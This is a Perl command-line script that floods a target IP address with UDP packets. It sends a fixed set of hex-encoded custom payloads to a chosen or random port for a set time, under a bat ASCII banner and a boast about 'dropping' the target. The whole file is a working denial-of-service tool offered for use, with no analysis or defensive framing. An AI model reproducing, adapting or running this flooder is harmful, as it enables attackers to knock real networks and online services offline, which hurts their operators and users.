#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
	
use Socket;
use strict;

my ($ip,$port,$time) = @ARGV;

my ($iaddr,$endtime,$pport);
my @packets = (
    "000100460000229900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f4c6",
    "000100460000229900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c7d0",
    "000200460000229939342e35352e3232302e353800000000000000000000000000000000000000000000000000000000000000000000000000000000854b",
    "000200460000229939342e35352e3232302e353800000000000000000000000000000000000000000000000000000000000000000000000000000000854c",
    "90f8fc044c78b3b20000229957541542cf72ba06f9b97168f162b5f458d9470f686a69c00685b029614503",
    "80787e59000cc24000002291b0842f6137e7a9291027307c83e1d50bddaefbf1f44556060cee5881623085e49aa4571b4d0e3573e4a3a27c4344ec0ae8093fffcc9e595a88f3b2bd796893b3480d9dc1ab39c7ed00e267b57b3a5d34557cb313855ef513ffcecae65879345586421b406d70df47289dec6666358cf18c9b1f04de1fa974099965a2e994376d9d50cf95b1cc0e471b74132d05685dc4d265c3c4df1b36da8176166d8115dcf3d77bcfb5595b3be2c112ca13174f4177d7a1c23842152161021667431dbb52f2b145ec71860ec346f9eeea333cf8f8dc86daca7b8b0ab4f160f86d8631867a425b6474a161288b3ee3cd2f0d09e2472e44e7e1559460121fa8a422adb236c1133290a610bde843d300000000",
    "9078fc054c78b77200002299bede000229dbc5ae9fd9482e9321664dc71a8259f164c0ac88ac3dced45d7e00000080",
    "80787e5a000cc600000022910b7c37c1bc497b64806b3d43437ed2197b30c4d110dadab1d2c125d635ac9057e052d2712c82e1293e45337f606bdaa294a028896f66343def5cd081561d55403f175a613735549452f10343569cf22eec85b1be356ae19b6d825b27c6a3f119930414b7f8ba905616503d13ff28409b867e26f87af9aaaadc49b781f36917cd411fca1d4fccf98435a6b913e498b5b91fc5652e2ac55c5bc2f1a4333c32a1adc626cb88b31513f1586ba26503187bf237d52b1fac8a2d9356fe8d36253ad37fd4933c49a4e01688fd074c19809e04f0a0c1e6f57c66677317d7ae08395950294f035346216fecfbd70e331bc6d9a5abe0a29d6a292244c3ef6b9397df77bcab59623def9e9d0f0401000000",
    "1337cafe01000000",
    "9078fc064c78bb3200002299bede0002dc04de35715eb272097881a28a4fba872c8deecb2f7fe4c418e3e201000080"
);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                         
                                  MMMM                                  
                                   MM                                  


EOTEXT

print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Random") . " Port With Custom Packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;

my @binary_packets = map { pack("H*", $_) } @packets;

for (;time() <= $endtime;) {
  $pport = $port ? $port : int(rand(65500))+1;
  
  foreach my $packet (@binary_packets) {
    send(flood, $packet, 0, pack_sockaddr_in($pport, $iaddr));
  }

}
